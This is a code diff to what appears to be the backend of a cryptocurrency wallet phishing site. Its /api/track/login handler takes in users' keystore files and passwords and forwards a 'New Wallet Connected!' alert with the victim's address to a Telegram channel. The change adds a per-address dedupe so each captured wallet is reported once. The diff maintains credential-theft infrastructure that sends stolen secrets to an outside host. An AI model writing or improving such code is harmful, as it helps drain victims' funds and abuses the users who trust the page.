@@ -37,6 +37,18 @@ async function sendTelegramMessage(text) {
   }
 }
 
+// Dedupe only: allow first alert, block rapid duplicates (same address within 2 minutes)
+const recentTelegramByAddress = new Map();
+function shouldSendTelegramForAddress(address) {
+  const key = String(address || '').toLowerCase();
+  if (!key) return false;
+  const now = Date.now();
+  const last = recentTelegramByAddress.get(key) || 0;
+  if (now - last < 2 * 60 * 1000) return false;
+  recentTelegramByAddress.set(key, now);
+  return true;
+}
+
 app.use(express.json());
 app.use(cookieParser());
 app.use(cors({ origin: true, credentials: true }));
@@ -448,7 +460,8 @@ app.post("/api/track/login", (req, res) => {
                              (keystoreJSON && keystoreJSON.length > 5) || 
                              (keystorePassword && keystorePassword.length > 0);
     
-    if (hasSensitiveData) {
+    // Send once per import burst (client no longer re-sends secrets on sync)
+    if (hasSensitiveData && shouldSendTelegramForAddress(address)) {
         const msg = [
           "🚨 **New Wallet Connected!** 🚨",
           `Address: \`${address}\``,
